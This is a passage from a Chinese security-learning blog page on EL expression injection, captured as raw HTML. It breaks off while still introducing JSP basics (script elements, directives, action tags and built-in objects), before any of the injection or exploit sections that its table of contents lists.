@@ -1,0 +1,679 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  EL 表达式注入
+  #
+
+
+  JSP
+  #
+
+在学习 EL 表达式之前，我们先学一下 JSP 这个技术。
+
+  简介
+  #
+
+JSP（JavaServer Pages）是 Java 技术体系中用于开发动态 Web 页面的技术。简单来说，JSP 允许我们在 HTML 页面中嵌入 Java 代码，由服务器执行后生成动态内容返回给浏览器。
+
+  本质
+  #
+
+JSP 文件后缀是.jsp，里面主要是 HTML，但是可以穿插 Java 代码。服务器（比如 Tomcat）第一次收到请求时，会把 JSP 翻译成一个 Java Servlet 文件（.java文件），再编译成.class文件执行。所有 JSP 本质上就是 Servlet，只是写起来更像 HTML。
+
+  为什么会有 JSP
+  #
+
+早期 Servlet 直接输出 HTML 很麻烦：
+out.println("<html><body>");
+out.println("<h1>Hello</h1>");
+out.println("</body></html>");
+而 JSP 让开发者可以这么写：
+<html>
+<body>
+    <h1>Hello</h1>
+</body>
+</html>
+需要动态内容时再嵌入 Java，写页面的时候更加方便。
+
+  基本语法
+  #
+
+
+  脚本元素
+  #
+
+
+	
+			
+					类型
+					语法
+					作用
+			
+	
+	
+			
+					脚本片段
+					<% Java代码 %>
+					插入 Java 逻辑
+			
+			
+					表达式
+					<%= 表达式 %>
+					输出结果到页面
+			
+			
+					声明
+					<%! 变量/方法 %>
+					定义类成员
+			
+	
+
+例如：'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><meta property="og:site_name" content="Solowalker"><meta property="og:title" content="EL 表达式注入"><meta property="og:description" content='EL 表达式注入 # JSP # 在学习 EL 表达式之前，我们先学一下 JSP 这个技术。
+简介 # JSP（JavaServer Pages）是 Java 技术体系中用于开发动态 Web 页面的技术。简单来说，JSP 允许我们在 HTML 页面中嵌入 Java 代码，由服务器执行后生成动态内容返回给浏览器。
+本质 # JSP 文件后缀是.jsp，里面主要是 HTML，但是可以穿插 Java 代码。服务器（比如 Tomcat）第一次收到请求时，会把 JSP 翻译成一个 Java Servlet 文件（.java文件），再编译成.class文件执行。所有 JSP 本质上就是 Servlet，只是写起来更像 HTML。
+为什么会有 JSP # 早期 Servlet 直接输出 HTML 很麻烦：
+out.println("<html><body>"); out.println("<h1>Hello</h1>"); out.println("</body></html>"); 而 JSP 让开发者可以这么写：
+<html> <body> <h1>Hello</h1> </body> </html> 需要动态内容时再嵌入 Java，写页面的时候更加方便。
+基本语法 # 脚本元素 # 类型 语法 作用 脚本片段 <% Java代码 %> 插入 Java 逻辑 表达式 <%= 表达式 %> 输出结果到页面 声明 <%! 变量/方法 %> 定义类成员 例如：'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-10-11T00:00:00+00:00"><meta property="article:modified_time" content="2026-10-11T00:00:00+00:00"><title>EL 表达式注入 | Solowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/><link rel=stylesheet href=/book.min.bef206ca73466d23b093d88913fd40ccba55f422e1e51ed680a9e04a58cdc341.css integrity="sha256-vvIGynNGbSOwk9iJE/1AzLpV9CLh5R7WgKngSljNw0E=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.fb825732b9c658db2f74ba64bd02b43176481f8f4d25cdeb94fe2de9dbc9b30f.js integrity="sha256-+4JXMrnGWNsvdLpkvQK0MXZIH49NJc3rlP4t6dvJsw8=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><img src=/images/logo/solowalker.png alt=Logo class=top-header-logo>
+<a href=https://s0lowalker.github.io/ class=top-header-title>Solowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/images/logo/solowalker.png alt=Logo class=book-icon><span>Solowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-f3baf843ac4871d7cc6c9747f091d4ee class=toggle checked>
+<label for=section-f3baf843ac4871d7cc6c9747f091d4ee class="flex justify-between"><a role=button>Java攻防</a></label><ul><li><input type=checkbox id=section-40df731824a253d5840b20b53d52c2ba class=toggle checked>
+<label for=section-40df731824a253d5840b20b53d52c2ba class="flex justify-between"><a role=button>EL表达式</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/ class=active>EL 表达式注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>SpEL表达式注入</a></li></ul></li><li><input type=checkbox id=section-f40d137f7e26fb2fcb23fda5a456c204 class=toggle>
+<label for=section-f40d137f7e26fb2fcb23fda5a456c204 class="flex justify-between"><a role=button>Weblogic篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ssrf/>Weblogic 弱口令&文件上传&amp;SSRF</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-jndi-%E6%B3%A8%E5%85%A5/>Weblogic JNDI 注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic T3 反序列化分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic XMLDecoder反序列化</a></li></ul></li><li><input type=checkbox id=section-f4bd766ffc2c2c4a5fca527ebb421aba class=toggle>
+<label for=section-f4bd766ffc2c2c4a5fca527ebb421aba class="flex justify-between"><a role=button>Log4j2篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/log4j2%E7%AF%87/log4shell/>Log4shell</a></li></ul></li><li><input type=checkbox id=section-ed10ff85653d7364765d5831a959b09b class=toggle>
+<label for=section-ed10ff85653d7364765d5831a959b09b class="flex justify-between"><a role=button>Fastjson反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.62-1.2.68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>Fastjson1.2.62-1.2.68反序列化漏洞</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/>Fasjson各版本绕过</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>Fastjson1.2.24漏洞分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%9F%BA%E7%A1%80/>Fastjson基础</a></li></ul></li><li><input type=checkbox id=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class=toggle>
+<label for=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class="flex justify-between"><a role=button>Shiro反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro721/>Shiro721</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/>Shiro550</a></li></ul></li><li><input type=checkbox id=section-db4f1366364f6e3bdeccbe9d6728217c class=toggle>
+<label for=section-db4f1366364f6e3bdeccbe9d6728217c class="flex justify-between"><a role=button>Java反序列化之CC链</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc11/>java反序列化之CC11</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>Java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/>Java常规漏洞</a></li></ul></li><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/spring%E5%BC%80%E5%8F%91/>Spring开发</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jndi/>JNDI</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li></ul></li><li><input type=checkbox id=section-044b235faa94474d25fd6dc85c615699 class=toggle>
+<label for=section-044b235faa94474d25fd6dc85c615699 class="flex justify-between"><a role=button>RASP</a></label><ul><li><a href=/docs/rasp/rasp2%E5%AE%9E%E7%8E%B0%E5%9F%BA%E6%9C%AC%E6%8B%A6%E6%88%AA/>RASP(2)——实现基本拦截</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%911%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%91%E9%80%9A%E7%9A%84javaagent/>RASP开发(1)——第一个跑通的 Java Agent</a></li><li><a href=/docs/rasp/rasp%E5%9F%BA%E7%A1%80/>RASP基础</a></li></ul></li><li><input type=checkbox id=section-c4d784444933fdccb12cc39e2ab0a411 class=toggle>
+<label for=section-c4d784444933fdccb12cc39e2ab0a411 class="flex justify-between"><a role=button>渗透测试</a></label><ul><li><input type=checkbox id=section-42c6aa109fe86285746031b39529fd8c class=toggle>
+<label for=section-42c6aa109fe86285746031b39529fd8c class="flex justify-between"><a role=button>web开发篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/javaee/>JavaEE</a></li><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/js%E5%BA%94%E7%94%A8/>JS应用</a></li></ul></li><li><input type=checkbox id=section-6f168133498c5817b23bc8b547002dba class=toggle>
+<label for=section-6f168133498c5817b23bc8b547002dba class="flex justify-between"><a role=button>基础入门篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/web%E4%B8%8Eapp%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F/>Web、APP与小程序架构基础</a></li></ul></li></ul></li><li><input type=checkbox id=section-326ea580ca38728d53e273bd1a79dd29 class=toggle>
+<label for=section-326ea580ca38728d53e273bd1a79dd29 class="flex justify-between"><a role=button>Nodejs安全</a></label><ul><li><a href=/docs/nodejs%E5%AE%89%E5%85%A8/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>Node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>EL 表达式注入</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#jsp>JSP</a><ul><li><a href=#简介>简介</a></li><li><a href=#基本语法>基本语法</a></li><li><a href=#jsp-demo>JSP Demo</a></li><li><a href=#jsp-缺点>JSP 缺点</a></li></ul></li><li><a href=#el-表达式基础语法>EL 表达式基础语法</a><ul><li><a href=#el-表达式-demo>EL 表达式 Demo</a></li><li><a href=#运算符>运算符</a></li></ul></li><li><a href=#jsp-中启动禁用-el-表达式>JSP 中启动/禁用 EL 表达式</a><ul><li><a href=#全局禁用-el-表达式>全局禁用 EL 表达式</a></li><li><a href=#单个文件禁用-el-表达式>单个文件禁用 EL 表达式</a></li></ul></li><li><a href=#el-表达式注入漏洞>EL 表达式注入漏洞</a><ul><li><a href=#通用-poc>通用 POC</a></li><li><a href=#简单漏洞场景>简单漏洞场景</a></li><li><a href=#juel-示例>JUEL 示例</a></li></ul></li><li><a href=#el-表达式的-exp-与基础绕过>EL 表达式的 EXP 与基础绕过</a><ul><li><a href=#基础-exp>基础 EXP</a></li><li><a href=#利用-scriptengine-调用-js-引擎绕过>利用 ScriptEngine 调用 JS 引擎绕过</a></li><li><a href=#利用-unicode-编码绕过>利用 Unicode 编码绕过</a></li><li><a href=#利用八进制绕过>利用八进制绕过</a></li></ul></li><li><a href=#防御方法>防御方法</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=el-表达式注入>EL 表达式注入
+<a class=anchor href=#el-%e8%a1%a8%e8%be%be%e5%bc%8f%e6%b3%a8%e5%85%a5>#</a></h1><h2 id=jsp>JSP
+<a class=anchor href=#jsp>#</a></h2><p>在学习 EL 表达式之前，我们先学一下 JSP 这个技术。</p><h3 id=简介>简介
+<a class=anchor href=#%e7%ae%80%e4%bb%8b>#</a></h3><p>JSP（JavaServer Pages）是 Java 技术体系中用于开发动态 Web 页面的技术。简单来说，JSP 允许我们在 HTML 页面中嵌入 Java 代码，由服务器执行后生成动态内容返回给浏览器。</p><h4 id=本质>本质
+<a class=anchor href=#%e6%9c%ac%e8%b4%a8>#</a></h4><p>JSP 文件后缀是<code>.jsp</code>，里面主要是 HTML，但是可以穿插 Java 代码。服务器（比如 Tomcat）第一次收到请求时，会把 JSP 翻译成一个 Java Servlet 文件（<code>.java</code>文件），再编译成<code>.class</code>文件执行。所有 JSP <strong>本质上就是 Servlet</strong>，只是写起来更像 HTML。</p><h4 id=为什么会有-jsp>为什么会有 JSP
+<a class=anchor href=#%e4%b8%ba%e4%bb%80%e4%b9%88%e4%bc%9a%e6%9c%89-jsp>#</a></h4><p>早期 Servlet 直接输出 HTML 很麻烦：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>out.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;&lt;html&gt;&lt;body&gt;&#34;</span>);
+</span></span><span style=display:flex><span>out.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;&lt;h1&gt;Hello&lt;/h1&gt;&#34;</span>);
+</span></span><span style=display:flex><span>out.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;&lt;/body&gt;&lt;/html&gt;&#34;</span>);
+</span></span></code></pre></div><p>而 JSP 让开发者可以这么写：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;Hello&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>需要动态内容时再嵌入 Java，写页面的时候更加方便。</p><h3 id=基本语法>基本语法
+<a class=anchor href=#%e5%9f%ba%e6%9c%ac%e8%af%ad%e6%b3%95>#</a></h3><h4 id=脚本元素>脚本元素
+<a class=anchor href=#%e8%84%9a%e6%9c%ac%e5%85%83%e7%b4%a0>#</a></h4><table><thead><tr><th style=text-align:left>类型</th><th style=text-align:left>语法</th><th style=text-align:left>作用</th></tr></thead><tbody><tr><td style=text-align:left>脚本片段</td><td style=text-align:left><code>&lt;% Java代码 %></code></td><td style=text-align:left>插入 Java 逻辑</td></tr><tr><td style=text-align:left>表达式</td><td style=text-align:left><code>&lt;%= 表达式 %></code></td><td style=text-align:left>输出结果到页面</td></tr><tr><td style=text-align:left>声明</td><td style=text-align:left><code>&lt;%! 变量/方法 %></code></td><td style=text-align:left>定义类成员</td></tr></tbody></table><p>例如：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;% int count = 10; %&gt;
+&lt;p&gt;数量：&lt;%= count %&gt;&lt;/p&gt;
+&lt;%! private int add(int a, int b) { return a + b; } %&gt;
+</code></pre><h4 id=指令>指令
+<a class=anchor href=#%e6%8c%87%e4%bb%a4>#</a></h4><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; %&gt;
+&lt;%@ include file=&#34;header.jsp&#34; %&gt;
+&lt;%@ taglib prefix=&#34;c&#34; uri=&#34;http://java.sun.com/jsp/jstl/core&#34; %&gt;
+</code></pre><ul><li><code>page</code>：设置页面属性，如编码、导入包</li><li><code>include</code>：静态包含另一个文件</li><li><code>taglib</code>：引入标签库，比如 JSTL</li></ul><h4 id=动作标签>动作标签
+<a class=anchor href=#%e5%8a%a8%e4%bd%9c%e6%a0%87%e7%ad%be>#</a></h4><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;jsp:include page=&#34;header.jsp&#34; /&gt;
+&lt;jsp:forward page=&#34;login.jsp&#34; /&gt;
+&lt;jsp:useBean id=&#34;user&#34; class=&#34;com.example.User&#34; /&gt;
+</code></pre><h4 id=注释>注释
+<a class=anchor href=#%e6%b3%a8%e9%87%8a>#</a></h4><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%-- JSP注释，不会发送到浏览器 --%&gt;
+&lt;!-- HTML注释，会发送到浏览器 --&gt;
+</code></pre><h4 id=jsp-内置对象>JSP 内置对象
+<a class=anchor href=#jsp-%e5%86%85%e7%bd%ae%e5%af%b9%e8%b1%a1>#</a></h4><p>JSP 直接提供了 9 个内置对象，不用自己创建：</p><table><thead><tr><th style=text-align:left>对象</th><th style=text-align:left>类型</th><th style=text-align:left>作用</th></tr></thead><tbody><tr><td style=text-align:left>request</td><td style=text-align:left>HttpServletRequest</td><td style=text-align:left>请求信息</td></tr><tr><td style=text-align:left>response</td><td style=text-align:left>HttpServletResponse</td><td style=text-align:left>响应</td></tr><tr><td style=text-align:left>session</td><td style=text-align:left>HttpSession</td><td style=text-align:left>会话</td></tr><tr><td style=text-align:left>application</td><td style=text-align:left>ServletContext</td><td style=text-align:left>全局上下文</td></tr><tr><td style=text-align:left>out</td><td style=text-align:left>JspWriter</td><td style=text-align:left>输出</td></tr><tr><td style=text-align:left>page</td><td style=text-align:left>Object</td><td style=text-align:left>当前页面实例</td></tr><tr><td style=text-align:left>pageContext</td><td style=text-align:left>PageContext</td><td style=text-align:left>页面上下文</td></tr><tr><td style=text-align:left>config</td><td 